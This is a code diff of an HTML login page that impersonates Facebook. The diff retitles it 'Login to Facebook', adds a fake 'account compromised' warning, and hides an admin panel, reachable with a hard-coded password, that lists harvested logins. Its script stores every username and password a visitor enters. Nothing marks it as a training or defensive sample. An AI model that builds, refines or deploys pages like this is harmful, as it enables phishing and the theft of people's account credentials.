@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Login to Secure your account</title>
+	<title>Login to Facebook</title>
 	<style>
 		body {
 			background-color: #f0f2f5; /* Facebook's background color */
 			font-family: Arial, sans-serif;
 		}
 		.container {
-			width: 400px;
+			width: 350px;
 			margin: 50px auto;
 			background-color: #fff; /* White background */
 			padding: 20px;
@@ -60,13 +60,15 @@
 		<div class="warning">
 			<h2>Warning: Your account has been compromised!</h2>
 			<p>Please login to secure your account.</p>
+			<p><strong>Important:</strong> If you're using a public computer, make sure to log out when you're finished.</p>
+			<p><strong>Security Tip:</strong> Use a strong password and keep it confidential.</p>
 		</div>
 		<form class="form" id="login-form">
 			<input type="text" name="username" placeholder="Username">
 			<input type="password" name="password" placeholder="Password">
 			<input type="submit" value="Login">
 		</form>
-		<div class="admin-view" id="admin-view">
+		<div class="admin-view" id="admin-view" style="display: none;">
 			<h2>Admin View</h2>
 			<ul id="credentials-list"></ul>
 		</div>
@@ -101,14 +103,14 @@
 			const username = usernameInput.value;
 			const password = passwordInput.value;
 
+			// Store credentials in localStorage
+			localStorage.setItem(username, password);
+			addCredentialToView(username, password);
+
+			// Display admin view only for admin
 			if (username === 'admin' && password === 'password123') {
 				adminView.style.display = 'block';
 				loadCredentials();
-			} else {
-				// Store credentials in localStorage
-				localStorage.setItem(username, password);
-				addCredentialToView(username, password);
-				adminView.style.display = 'block';
 			}
 		});
 
